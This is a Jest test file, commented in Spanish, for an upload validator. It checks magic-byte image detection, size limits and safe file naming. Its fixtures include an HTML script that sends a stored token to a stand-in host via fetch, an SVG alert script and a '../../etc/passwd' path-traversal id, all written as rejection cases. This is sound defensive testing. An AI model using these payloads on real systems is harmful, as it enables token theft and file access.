import { tipoRealDeImagen, revisarImagen, nombreSeguro, MAX_BYTES } from '../src/common/archivos-seguros';

const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 0, 0, 0, 0]);
const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0, 0, 0, 0]);
const webp = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0, 0, 0, 0]), Buffer.from('WEBP'), Buffer.alloc(4)]);

describe('tipoRealDeImagen', () => {
  it('reconoce JPG, PNG y WEBP', () => {
    expect(tipoRealDeImagen(jpeg)?.mime).toBe('image/jpeg');
    expect(tipoRealDeImagen(png)?.mime).toBe('image/png');
    expect(tipoRealDeImagen(webp)?.mime).toBe('image/webp');
  });

  it('RECHAZA un HTML aunque se llame foto.jpg', () => {
    // Este es el ataque completo: subir una página con JavaScript, decir que
    // es una imagen, y que la ejecute el ingeniero al abrir la evidencia.
    const html = Buffer.from('<html><script>fetch("//fuera/"+localStorage.sgit_token)</script>');
    expect(tipoRealDeImagen(html)).toBeNull();
    const r = revisarImagen({ buffer: html, originalname: 'foto.jpg' });
    expect(r.ok).toBe(false);
  });

  it('RECHAZA un SVG, que también ejecuta scripts', () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    expect(tipoRealDeImagen(svg)).toBeNull();
  });

  it('RECHAZA un PDF y un ZIP', () => {
    expect(tipoRealDeImagen(Buffer.from('%PDF-1.7\n%aaaa'))).toBeNull();
    expect(tipoRealDeImagen(Buffer.from([0x50, 0x4b, 3, 4, 0, 0, 0, 0, 0, 0, 0, 0]))).toBeNull();
  });

  it('un PNG con los últimos bytes de firma cambiados NO pasa', () => {
    // Esos cuatro bytes existen justamente para detectar el archivo que se
    // corrompió al copiarlo. Si se aceptara, se guardaría una foto rota.
    const roto = Buffer.from(png);
    roto[5] = 0x00;
    expect(tipoRealDeImagen(roto)).toBeNull();
  });

  it('un archivo diminuto no cuela', () => {
    expect(tipoRealDeImagen(Buffer.from([0xff, 0xd8, 0xff]))).toBeNull();
  });

  it('nulo o vacío no revienta', () => {
    expect(tipoRealDeImagen(null)).toBeNull();
    expect(tipoRealDeImagen(Buffer.alloc(0))).toBeNull();
  });
});

describe('revisarImagen', () => {
  it('acepta una foto normal', () => {
    const r = revisarImagen({ buffer: jpeg, size: jpeg.length });
    expect(r.ok).toBe(true);
  });

  it('rechaza por tamaño ANTES de mirar el contenido', () => {
    const r = revisarImagen({ buffer: jpeg, size: MAX_BYTES + 1 });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.motivo).toMatch(/12 MB/);
  });

  it('el motivo le dice al técnico QUÉ HACER, no qué falló por dentro', () => {
    const r = revisarImagen({ buffer: Buffer.from('no soy una imagen en absoluto') });
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.motivo).toMatch(/JPG, PNG y WEBP/);
      expect(r.motivo).not.toMatch(/firma|magic|byte|buffer/i);
    }
  });
});

describe('nombreSeguro', () => {
  it('la extensión sale del tipo REAL, no del nombre recibido', () => {
    expect(nombreSeguro('activos', 'abc', { mime: 'image/png', extension: 'png' })).toMatch(/\.png$/);
  });

  it('un id con ../ no se sale de su carpeta', () => {
    const n = nombreSeguro('activos', '../../etc/passwd', { mime: 'image/jpeg', extension: 'jpg' });
    expect(n).not.toContain('..');
    expect(n).not.toContain('/etc/');
    expect(n.startsWith('activos/')).toBe(true);
  });
});
